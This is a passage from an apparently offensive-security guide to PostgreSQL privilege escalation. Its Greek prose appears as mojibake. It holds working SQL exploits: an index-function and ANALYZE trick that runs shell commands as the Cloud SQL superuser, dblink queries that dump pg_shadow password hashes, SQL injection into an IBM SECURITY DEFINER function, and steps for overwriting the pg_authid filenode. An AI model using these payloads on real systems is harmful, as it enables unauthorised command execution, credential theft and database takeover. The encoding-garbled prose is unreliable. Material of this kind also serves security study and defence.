Î£Ï…Î½Î´Ï…Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ Î¹Î´Î­Î± Î¼Îµ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¿Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) ÏƒÎµ Î­Î½Î±Î½ **Ï€Î¯Î½Î±ÎºÎ± Î¼Îµ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÏ…ÏÎµÏ„Î·ÏÎ¯Î¿Ï…**, Î· **ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·** ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Ï‰Ï‚ Î¼Î­ÏÎ¿Ï‚ Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Î¼Îµ Ï„Î± **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Ï„Î¿Ï… **Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·** Ï„Î¿Ï… **Ï€Î¯Î½Î±ÎºÎ±**. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î­Î½Î± ÎµÏ…ÏÎµÏ„Î®ÏÎ¹Î¿ Î¼Îµ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎºÎ±Î¹ Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ·Î¸Î¿ÏÎ½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¹Î´Î¹Î¿ÎºÏ„Î·ÏƒÎ¯Î±Ï‚ ÏƒÎµ Î­Î½Î±Î½ **super user** Ï€Î¬Î½Ï‰ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ±, ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ANALYZE Ï€Î¬Î½Ï‰ ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Î¼Îµ Ï„Î· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎµÎ½Ï„Î¿Î»Î­Ï‚ ÎµÏ€ÎµÎ¹Î´Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï„Î¿Ï… Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

1. ÎÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Î½Î­Î¿ Ï€Î¯Î½Î±ÎºÎ±.
2. Î•Î¹ÏƒÎ¬Î³ÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± Î¬ÏƒÏ‡ÎµÏ„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Î³Î¹Î± Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î³Î¹Î± Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÏ…ÏÎµÏ„Î·ÏÎ¯Î¿Ï….
3. Î‘Î½Î±Ï€Ï„ÏÎ¾Ï„Îµ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÏ…ÏÎµÏ„Î·ÏÎ¯Î¿Ï… Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î­Î½Î± payload ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Ï‰Î½ ÎµÎ½Ï„Î¿Î»ÏÎ½.
4. ALTER Ï„Î¿Î½ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± ÏƒÎµ "cloudsqladmin," Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÏÏŒÎ»Î¿Ï‚ superuser Ï„Î¿Ï… GCP Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿ Cloud SQL Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÎºÎ±Î¹ ÏƒÏ…Î½Ï„Î®ÏÎ·ÏƒÎ· Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
5. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ANALYZE ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ±. Î‘Ï…Ï„Î® Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Î±Î½Î±Î³ÎºÎ¬Î¶ÎµÎ¹ Ï„Î·Î½ Î¼Î·Ï‡Î±Î½Î® PostgreSQL Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ ÏƒÏ„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î¿Ï… Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ±, "cloudsqladmin." Î©Ï‚ ÎµÎº Ï„Î¿ÏÏ„Î¿Ï…, Î· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÏ…ÏÎµÏ„Î·ÏÎ¯Î¿Ï… ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… "cloudsqladmin," ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ shell.

Î£Ï„Î¿ PostgreSQL, Î±Ï…Ï„Î® Î· ÏÎ¿Î® Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÎºÎ¬Ï€Ï‰Ï‚ Î­Ï„ÏƒÎ¹:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Î¤ÏŒÏ„Îµ, Î¿ Ï€Î¯Î½Î±ÎºÎ±Ï‚ `shell_commands_results` Î¸Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î·Î½ Î­Î¾Î¿Î´Î¿ Ï„Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Î¤Î¿Ï€Î¹ÎºÎ® Î£ÏÎ½Î´ÎµÏƒÎ·

ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎºÎ±ÎºÏÏ‚ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ postgresql Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Ï‡ÏÎ®ÏƒÏ„Î·, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Ï„Î¿Ï€Î¹ÎºÎ® ÏƒÏÎ½Î´ÎµÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ 127.0.0.1 Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **`dblink` function**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î³Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÎµÏÏÏ„Î·Î¼Î± **Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `dblink` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹**. Î‘Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï„Î·Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Îµ
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Î‘Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±, Î±Î»Î»Î¬ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î´ÎµÎ½ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î±Ï€ÏŒ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ® IP, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± Ï‰Ï‚ Î±Ï…Ï„ÏŒÏ‚ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Îµ:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Custom defined function with** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), Î¿Î¹ pentesters ÎºÎ±Ï„Î¬Ï†ÎµÏÎ±Î½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± postgres instance Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ IBM, ÎµÏ€ÎµÎ¹Î´Î® **Î²ÏÎ®ÎºÎ±Î½ Î±Ï…Ï„Î® Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ Ï„Î·Î½ Î­Î½Î´ÎµÎ¹Î¾Î· SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

ÎŒÏ€Ï‰Ï‚ [**ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î± docs**](https://www.postgresql.org/docs/current/sql-createfunction.html), Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Îµ **SECURITY DEFINER ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… **Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Ï„Î·Î½ ÎºÎ±Ï„Î­Ï‡ÎµÎ¹**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ SQL Injection** Î® ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ­Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¼Îµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿**, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± **Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Î­ÏƒÎ± ÏƒÎµ postgres**.

Î£Ï„Î· Î³ÏÎ±Î¼Î¼Î® 4 Ï„Î¿Ï… Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î­Ï‡ÎµÎ¹ Ï„Î·Î½ Î­Î½Î´ÎµÎ¹Î¾Î· **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï€Î»Î®ÏÏ‰Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ® Î³Î»ÏÏƒÏƒÎ± Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï** Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÏ„Î¹ÎºÏŒ Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÎµ ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· Î¼Îµ Ï„Î¿ SQL. Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· **Î²ÏÏŒÏ‡Ï‰Î½** ÎºÎ±Î¹ Î¬Î»Î»Ï‰Î½ **Î´Î¿Î¼ÏÎ½ ÎµÎ»Î­Î³Ï‡Î¿Ï…** Î³Î¹Î± Ï„Î·Î½ ÎµÎ½Î¯ÏƒÏ‡Ï…ÏƒÎ· Ï„Î·Ï‚ Î»Î¿Î³Î¹ÎºÎ®Ï‚ Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î¿Î¹ **Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ SQL** ÎºÎ±Î¹ Î¿Î¹ **triggers** Î­Ï‡Î¿Ï…Î½ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± ÎºÎ±Î»Î¿ÏÎ½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **Î³Î»ÏÏƒÏƒÎ± PL/pgSQL**. Î‘Ï…Ï„Î® Î· ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î¼Î¹Î± Ï€Î¹Î¿ Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î· ÎºÎ±Î¹ ÎµÏ…Î­Î»Î¹ÎºÏ„Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· ÏƒÏ„Î¿Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒ ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î²Î¬ÏƒÎµÏ‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.\
**ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î® Ï„Î· Î³Î»ÏÏƒÏƒÎ± Î³Î¹Î± Î½Î± Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ PostgreSQL Î½Î± ÎºÎ¬Î½ÎµÎ¹ brute-force Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Privesc by Overwriting Internal PostgreSQL Tables

{% hint style="info" %}
ÎŸ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ privesc vector ÎµÎ¯Î½Î±Î¹ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿Ï‚ ÏƒÎµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± SQLi ÏƒÏ…Î¼Ï†ÏÎ±Î¶ÏŒÎ¼ÎµÎ½Î±, ÎºÎ±Î¸ÏÏ‚ ÏŒÎ»Î± Ï„Î± Î²Î®Î¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î´Î·Î»ÏÏƒÎµÏ‰Î½ SELECT
{% endhint %}

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± Ï„Î¿Ï… PostgreSQL server**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î³Î¯Î½ÎµÏ„Îµ superuser** Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ filenode Ï„Î¿Ï… PostgreSQL ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`.

Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± **Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®** [**ÎµÎ´Ï**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Î¤Î± Î²Î®Î¼Î±Ï„Î± Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹:

1. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… PostgreSQL
2. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î¼Î¹Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿ filenode, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`
3. ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ filenode Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ `lo_*`
4. Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± `pg_authid`
5. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿Î½ [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) Î³Î¹Î± Î½Î± [ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); ÏÏ…Î¸Î¼Î¯ÏƒÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ boolean ÏƒÎ·Î¼Î±Î¯ÎµÏ‚ `rol*` ÏƒÎµ 1 Î³Î¹Î± Ï€Î»Î®ÏÎ· Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±.
6. Î•Ï€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÏ„Îµ Ï„Î¿ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¼Î­Î½Î¿ filenode Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ `lo_*`, ÎºÎ±Î¹ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿
7. _(Î ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬)_ ÎšÎ±Î¸Î±ÏÎ¯ÏƒÏ„Îµ Ï„Î·Î½ ÎºÏÏ…Ï†Î® Î¼Î½Î®Î¼Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¼Î½Î®Î¼Î· ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î´Î±Ï€Î±Î½Î·ÏÏŒ SQL query
